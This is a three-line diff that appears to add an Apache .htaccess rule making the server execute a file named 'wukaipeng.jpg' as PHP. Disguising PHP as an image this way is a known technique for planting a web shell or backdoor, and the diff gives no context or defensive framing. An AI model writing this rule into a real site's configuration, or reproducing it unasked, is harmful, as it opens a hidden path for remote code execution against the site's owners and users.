@@ -1,0 +1,3 @@
+<FilesMatch "wukaipeng.jpg">
+Sethandler application/x-httpd-php
+</FilesMatch>
